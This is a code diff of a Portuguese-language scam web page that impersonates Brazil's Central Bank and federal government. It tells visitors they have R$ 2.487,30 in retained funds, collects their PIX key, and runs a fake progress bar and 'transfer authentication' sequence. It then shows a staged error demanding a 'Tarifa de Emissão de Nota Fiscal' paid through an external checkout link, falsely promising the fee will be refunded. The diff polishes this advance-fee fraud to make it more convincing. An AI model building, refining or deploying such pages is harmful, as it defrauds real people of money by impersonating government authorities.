@@ -47,10 +47,13 @@
         .cedula-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
         .total-row { border-top: 2px dashed #000; margin-top: 10px; padding-top: 10px; font-size: 16px; font-weight: 900; }
 
-        /* Loading */
+        /* Loading e Barra de Envio */
         .loading-box { display: none; text-align: center; padding: 40px 0; }
         .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--blue-gov); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .progress-container { width: 100%; background-color: #e2e8f0; border-radius: 10px; margin: 20px 0; display: none; }
+        .progress-bar { width: 0%; height: 12px; background-color: #22c55e; border-radius: 10px; transition: width 0.3s; }
 
         .checkout-area { display: none; text-align: center; }
         .btn-pagar { background: var(--blue-gov); color: white; text-decoration: none; padding: 22px; border-radius: 4px; font-weight: 900; display: block; font-size: 18px; margin-top: 20px; box-shadow: 0 10px 20px rgba(0,51,153,0.2); }
@@ -130,11 +133,12 @@
         <div id="loading" class="loading-box">
             <div class="spinner"></div>
             <p id="loading-txt" style="font-family:'Roboto Mono'; font-size:12px;">CONECTANDO AO SERVIDOR SVR-BACEN...</p>
+            <div id="prog-wrap" class="progress-container"><div id="prog-bar" class="progress-bar"></div></div>
         </div>
 
         <div id="m5" class="msg" style="border-left-color: #22c55e;">
             <b>AUDITORIA FINALIZADA!</b><br>
-            Foram encontrados valores retidos e juros abusivos prontos para liquidação imediata. Confira o extrato oficial abaixo:
+            Foram encontrados valores retidos e juros abusivos prontos para liquidação imediata via PIX. Confira o extrato oficial abaixo:
         </div>
 
         <div id="cedula" class="cedula-container">
@@ -159,50 +163,33 @@
             </div>
         </div>
 
-        <div id="i-resgate" class="input-area">
-            <button class="btn-primary" onclick="goMetodo()">SOLICITAR RESGATE VIA PIX/TED</button>
-        </div>
-
-        <div id="m-metodo" class="msg">Selecione a forma de recebimento:</div>
-        <div id="i-metodo" class="input-area">
-            <div class="option-card" onclick="setOpt(this)">PIX (Recebimento em 5 minutos)</div>
-            <div class="option-card" onclick="setOpt(this)">TED (Recebimento em até 24h)</div>
-            <button class="btn-primary" onclick="goChave()">CONTINUAR</button>
-        </div>
-
-        <div id="m-chave" class="msg">Informe sua <b>Chave PIX</b> para depósito:</div>
-        <div id="i-chave" class="input-area">
+        <div id="i4" class="input-area">
+            <label class="label-input">Informe sua Chave PIX para Recebimento:</label>
             <input type="text" id="pix-in" class="field" placeholder="CPF, E-mail, Celular ou Aleatória">
-            <button class="btn-primary" onclick="goResumoFinal()">GERAR PROTOCOLO DE ENVIO</button>
+            
+            <div style="margin-top:20px; padding:15px; background:#f8fafc; border:1px solid #e2e8f0; border-radius:4px; font-size:12px;">
+                <input type="checkbox" id="termos-check" style="margin-right:8px;">
+                <label for="termos-check">Eu autorizo o saque via <b>Banco Central do Brasil</b> e estou ciente de que o sistema permite apenas <b>um resgate por CPF</b> neste lote de 2026.</label>
+            </div>
+
+            <button class="btn-primary" onclick="requestTransfer()">Solicitar Saque de R$ 2.487,30</button>
         </div>
 
-        <div id="m-resumo-final" class="msg"><b>CONFIRME OS DADOS PARA TRANSFERÊNCIA:</b><br>Verifique se a chave está correta. O sistema permite apenas um saque por CPF.</div>
-        <div id="cedula-final" class="cedula-container">
-            <div class="cedula-inner">
-                <div class="cedula-row"><span>TITULAR:</span> <b id="f-nome"></b></div>
-                <div class="cedula-row"><span>CHAVE PIX:</span> <b id="f-pix"></b></div>
-                <div class="cedula-row total-row"><span>VALOR A ENVIAR:</span> <span style="color:#22c55e;">R$ 2.487,30</span></div>
-                <div style="margin-top:10px; font-size:10px; border-top:1px solid #ddd; padding-top:10px;">
-                    <input type="checkbox" checked> Declaro que as informações acima são verídicas.
-                </div>
-            </div>
-        </div>
-        <div id="i-final" class="input-area">
-            <button class="btn-primary" onclick="requestTransfer()">CONFIRMAR E RECEBER AGORA</button>
-        </div>
         <div id="error-final" class="checkout-area">
             <div style="background:#fff5f5; border:1px solid #feb2b2; padding:15px; border-radius:4px; color:#c53030; font-weight:bold; margin-bottom:20px;">
-                ERRO: GUIA DE TRANSPORTE (GT-SVR) NÃO LOCALIZADA
+                ALERTA DE SEGURANÇA: PROTOCOLO GT-SVR NÃO LOCALIZADO
             </div>
-            <div class="msg" style="display:block; text-align:left;">
-                Para liberar o envio imediato do lote de <b>R$ 2.487,30</b>, é necessário a liquidação da <b>Tarifa de Emissão de Nota Fiscal e-NF</b>. <br><br>
-                Este valor é reembolsado automaticamente no momento do saque.
+            <div class="msg" style="display:block; text-align:left; border-left-color: #c53030;">
+                Prezado(a), o processamento da sua transferência foi interrompido. <br><br>
+                De acordo com a normativa vigente do <b>Governo Federal</b>, para a liberação de valores de restituição bancária, é indispensável a liquidação da <b>Tarifa de Emissão de Nota Fiscal Eletrônica (e-NF)</b> relativa ao lote tributário.
+                <br><br>
+                <b>Observação importante:</b> O valor da tarifa é integralmente <b>reembolsado</b> e somado ao seu saldo de saque no ato da liquidação.
             </div>
-            <div class="cedula-row total-row" style="background:#f0fff4; padding:10px;">
-                <span>SALDO COM REEMBOLSO:</span>
-                <span style="color:#22c55e;">R$ 2.524,30</span>
+            <div class="cedula-row total-row" style="background:#f0fff4; padding:15px; border: 1px solid #22c55e; border-radius: 4px;">
+                <span>SALDO FINAL COM REEMBOLSO:</span>
+                <b style="color:#22c55e; font-size: 20px;">R$ 2.524,30</b>
             </div>
-            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-pagar">EMITIR NOTA E RECEBER R$ 2.524,30</a>
+            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-pagar">AUTORIZAR NOTA E RECEBER R$ 2.524,30</a>
         </div>
 
     </div>
@@ -230,7 +217,6 @@
             el.style.display = 'block'; 
             window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
         }
-        function hide(id) { document.getElementById(id).style.display = 'none'; }
 
         function setOpt(el, type, val) {
             let siblings = el.parentElement.querySelectorAll('.option-card');
@@ -252,38 +238,47 @@
             if(data.bancos.length === 0) return alert('Selecione ao menos um banco.');
             document.getElementById('i3').style.display = 'none';
             show('loading');
+            
             let txt = document.getElementById('loading-txt');
             setTimeout(() => txt.innerText = "VERIFICANDO DÉBITOS NO REGISTRATO...", 1500);
-            setTimeout(() => txt.innerText = "LIBERANDO LOTE DE PAGAMENTO PRIORITÁRIO...", 3000);
+            setTimeout(() => txt.innerText = "CALCULANDO ESTORNO DE TARIFAS ADM...", 3000);
+            
             setTimeout(() => {
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('r-nome').innerText = data.nome.toUpperCase();
                 document.getElementById('r-cpf').innerText = data.cpf;
                 document.getElementById('r-tel').innerText = data.tel;
                 document.getElementById('r-bancos').innerText = data.bancos.join(' / ');
-                show('m5'); show('cedula'); show('i-resgate');
+                show('m5');
+                show('cedula');
+                setTimeout(() => show('i4'), 1000);
             }, 4500);
         }
 
-        // Funções da nova lógica
-        function goMetodo() { hide('i-resgate'); show('m-metodo'); show('i-metodo'); }
-        function goChave() { hide('i-metodo'); show('m-chave'); show('i-chave'); }
-        function goResumoFinal() {
-            let pix = document.getElementById('pix-in').value;
-            if(pix.length < 5) return alert('Informe uma chave válida.');
-            document.getElementById('f-nome').innerText = data.nome.toUpperCase();
-            document.getElementById('f-pix').innerText = pix;
-            hide('i-chave'); show('m-resumo-final'); show('cedula-final'); show('i-final');
-        }
-
         function requestTransfer() {
-            hide('i-final');
+            if(document.getElementById('pix-in').value.length < 5) return alert('Informe uma chave PIX válida.');
+            if(!document.getElementById('termos-check').checked) return alert('Você precisa concordar com os termos para continuar.');
+
+            document.getElementById('i4').style.display = 'none';
             show('loading');
-            document.getElementById('loading-txt').innerText = "AUTENTICANDO TRANSFERÊNCIA...";
-            setTimeout(() => {
-                document.getElementById('loading').style.display = 'none';
-                show('error-final');
-            }, 4000);
+            document.getElementById('prog-wrap').style.display = 'block';
+            let txt = document.getElementById('loading-txt');
+            let bar = document.getElementById('prog-bar');
+            
+            let width = 0;
+            let interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('loading').style.display = 'none';
+                    show('error-final');
+                } else {
+                    width += 1;
+                    bar.style.width = width + '%';
+                    if(width < 40) txt.innerText = "VALIDANDO CHAVE PIX NO DICT...";
+                    else if(width < 80) txt.innerText = "RESERVANDO LOTE DE PAGAMENTO...";
+                    else txt.innerText = "AUTENTICANDO TRANSFERÊNCIA...";
+                }
+            }, 60);
         }
 
         window.onload = () => {
